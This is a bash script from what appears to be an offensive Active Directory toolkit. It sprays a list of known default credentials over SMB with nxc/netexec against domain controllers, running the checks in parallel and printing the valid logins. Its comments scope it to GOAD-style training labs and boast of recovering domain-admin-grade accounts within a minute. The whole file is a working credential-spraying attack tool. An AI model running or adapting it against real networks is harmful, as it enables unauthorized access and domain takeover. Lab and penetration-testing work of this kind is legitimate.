#!/bin/bash
# Parallel stock-credential check for known labs. Lab / RoE only.
#
# Fans a documented user:password list (conf/creds.goad) across the given DCs
# with nxc, ADTK_FANOUT at a time, and prints the valid pairs. On GOAD-family
# labs this is the fastest possible foothold — .refinements/2.md landed 21/23
# stock creds (incl. DA-grade lord.varys / eddard.stark) this way in ~1 min,
# before recon. Run it first on --profile goad; fall back to the full chain if
# nothing hits.
#
#   /opt/adtk/spray-stock.sh 192.168.56.10 192.168.56.11 192.168.56.12
#   ADTK_CREDS=/opt/adtk/conf/creds.goad /opt/adtk/spray-stock.sh 192.168.56.10
#
# NOTE: this is a known-answer check (one guess per known pair), not a blind
# spray — it does not iterate a wordlist per account, so it will not trip
# lockout the way a season/rockyou spray can. Still watch --pass-pol first if
# the lab has an aggressive threshold.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"

pick_creds() {
  local c
  for c in \
    "${ADTK_CREDS:-}" \
    /opt/adtk/conf/creds.goad \
    /opt/adtk/conf/creds.goad.example \
    "$HERE/../conf/creds.goad" \
    "$HERE/../conf/creds.goad.example"; do
    [ -n "$c" ] && [ -f "$c" ] && { echo "$c"; return 0; }
  done
  return 1
}

CREDS="$(pick_creds)" || { echo "[!] no creds file (conf/creds.goad[.example])" >&2; exit 2; }

if [ "$#" -eq 0 ]; then
  echo "usage: $0 <dc-ip> [dc-ip ...]" >&2
  echo "       (one or more DC/host IPs to check the stock creds against)" >&2
  exit 2
fi

NXC="$(command -v nxc || command -v netexec || true)"
[ -n "$NXC" ] || { echo "[!] nxc/netexec missing — run bootstrap" >&2; exit 2; }

FAN="$HERE/fan.sh"
[ -x "$FAN" ] || FAN="bash $HERE/fan.sh"

# Build one nxc command per (host, user:pass); --continue-on-success so a hit
# does not stop the account's other guesses. Grep to the [+] valid lines.
{
  for host in "$@"; do
    grep -vE '^\s*(#|$)' "$CREDS" | while IFS= read -r pair; do
      user="${pair%%:*}"
      pass="${pair#*:}"
      # single-quote the password; escape any embedded single quotes
      epass="'${pass//\'/\'\\\'\'}'"
      echo "$NXC smb $host -u '$user' -p $epass --continue-on-success 2>/dev/null | grep -a '\[+\]'"
    done
  done
} | $FAN
